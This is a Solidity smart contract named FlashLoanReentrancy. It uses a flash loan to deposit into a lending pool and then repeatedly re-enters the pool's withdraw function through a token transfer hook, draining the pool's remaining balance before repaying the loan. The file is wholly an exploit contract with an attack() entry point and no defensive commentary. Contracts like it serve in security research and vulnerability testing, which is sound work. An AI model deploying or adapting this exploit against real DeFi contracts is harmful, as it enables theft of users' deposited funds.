
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IPool {
    function deposit(address token, uint256 amount) external;
    function withdraw(address token, uint256 amount) external;
    function flashLoan(address receiver, address token, uint256 amount, bytes calldata data) external;
}

interface IERC20 {
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

contract FlashLoanReentrancy {
    IPool public pool;
    IERC20 public token;
    uint256 public attackCount;
    uint256 public maxAttacks;

    constructor(address _pool, address _token) {
        pool = IPool(_pool);
        token = IERC20(_token);
    }

    function attack(uint256 amount) external {
        pool.flashLoan(address(this), address(token), amount, "");
    }

    function onFlashLoan(address _token, uint256 amount, bytes calldata) external {
        token.approve(address(pool), amount);
        pool.deposit(address(token), amount);

        attackCount = 0;
        maxAttacks = 5;
        pool.withdraw(address(token), amount); // re-enters via token transfer hook

        token.transfer(msg.sender, amount); // repay flash loan
    }

    function reenter(address _token, uint256 amount) external {
        // called by the pool's token hook; drains remaining balance
        if (attackCount < maxAttacks) {
            attackCount++;
            pool.withdraw(_token, amount);
        }
    }
}
